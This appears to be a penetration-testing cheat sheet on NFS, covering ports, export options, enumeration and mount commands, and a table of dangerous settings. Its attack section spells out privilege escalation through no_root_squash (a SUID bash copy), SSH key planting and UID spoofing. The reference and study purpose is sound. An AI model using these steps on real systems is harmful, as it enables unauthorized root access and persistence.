#NFS #NetworkFileSystem #filetransfer

## What is NFS?
Network File System — protocol for accessing files over a network as if they were local. Common on Linux/Unix. Used for shared storage, backups, and home directories.

- Port **TCP/UDP 2049** — NFS
- Port **TCP/UDP 111** — rpcbind/portmapper (NFS support service)
- Exports configured in `/etc/exports`
- NFSv4 works through firewalls (single port), older versions need rpcbind

---

## NFS Versions

| Version | Features |
|---|---|
| NFSv2 | Older; operated entirely over UDP |
| NFSv3 | Variable file sizes, better error reporting; not fully NFSv2 compatible |
| NFSv4 | Kerberos auth, firewall-friendly, ACLs, stateful, improved security |

---

## Configuration Files

### /etc/exports

```
# Syntax: <share_path> <host>(<options>)
/var/nfs/general *(rw,sync,no_subtree_check)
/home            10.0.0.0/24(rw,sync,no_root_squash)
/data            192.168.1.5(ro,sync)
```

| Export Option | Description |
|---|---|
| `rw` | Read and write permissions |
| `ro` | Read only |
| `sync` | Synchronous data transfer (safer, slower) |
| `async` | Asynchronous transfer (faster, less safe) |
| `secure` | Only ports < 1024 accepted |
| `insecure` | Ports > 1024 accepted |
| `no_subtree_check` | Disable subdirectory tree checking (common, reduces errors) |
| `root_squash` | Map root UID/GID 0 to anonymous (default, security measure) |
| `no_root_squash` | Root on client = root on server — **dangerous** |
| `all_squash` | Map all UIDs/GIDs to anonymous |
| `anonuid=<uid>` | UID for anonymous user |
| `anongid=<gid>` | GID for anonymous user |

---

## Enumeration

```bash
# Nmap NFS scripts
nmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs -sV <target>
nmap -p 111 --script rpcinfo <target>

# showmount — list exported shares
showmount -e <target>

# rpcinfo — list RPC services
rpcinfo -p <target>

# Metasploit
use auxiliary/scanner/nfs/nfsmount
```

---

## Mount / Access

```bash
# Mount NFS share (to local directory)
sudo mkdir -p /mnt/nfs_target
sudo mount -t nfs <target>:/ /mnt/nfs_target -o nolock
sudo mount -t nfs <target>:/home /mnt/nfs_target -o nolock
sudo mount -t nfs4 <target>:/share /mnt/nfs_target

# List exported shares
showmount -e <target>

# Unmount
sudo umount /mnt/nfs_target

# Check what's mounted
df -h
mount | grep nfs
```

---

## Attack Vectors

### Privilege Escalation via no_root_squash

When a share is exported with `no_root_squash`, root on the client = root on the server.

```bash
# 1. Mount the share
sudo mount -t nfs <target>:/home /mnt/nfs_target -o nolock

# 2. Copy bash to the share as root
sudo cp /bin/bash /mnt/nfs_target/
sudo chmod +s /mnt/nfs_target/bash  # set SUID bit

# 3. On the target machine (via SSH or shell), execute:
/home/bash -p  # -p preserves effective UID (runs as root)
```

### SSH Key Placement via no_root_squash

```bash
# 1. Mount the share
sudo mount -t nfs <target>:/home/user /mnt/nfs_target -o nolock

# 2. Add your SSH public key
sudo mkdir -p /mnt/nfs_target/.ssh
sudo bash -c 'cat ~/.ssh/id_rsa.pub >> /mnt/nfs_target/.ssh/authorized_keys'

# 3. SSH in as user
ssh user@<target>
```

### UID Spoofing

```bash
# NFS maps access by UID — if share uses uid-based permissions
# Create a local user with same UID as target
sudo useradd -u 1001 targetuser
sudo su - targetuser
ls /mnt/nfs_target  # access as UID 1001
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `no_root_squash` | Root on client = root on server → easy privesc |
| `*(rw,...)` wildcard | Any host can mount and write |
| `insecure` | Clients can use unprivileged ports |
| Sensitive data in exports | Data exposure |
| NFSv2/3 without auth | No Kerberos → UID spoofing |

---

## Quick Reference

| Goal | Command |
|---|---|
| List exports | `showmount -e host` |
| Mount share | `sudo mount -t nfs host:/share /mnt/target -o nolock` |
| Unmount | `sudo umount /mnt/target` |
| Check exports config | `cat /etc/exports` |
| SUID bash privesc | `cp /bin/bash /mnt; chmod +s /mnt/bash; ./bash -p` |
| Nmap enum | `nmap -p 111,2049 --script nfs-showmount,nfs-ls` |
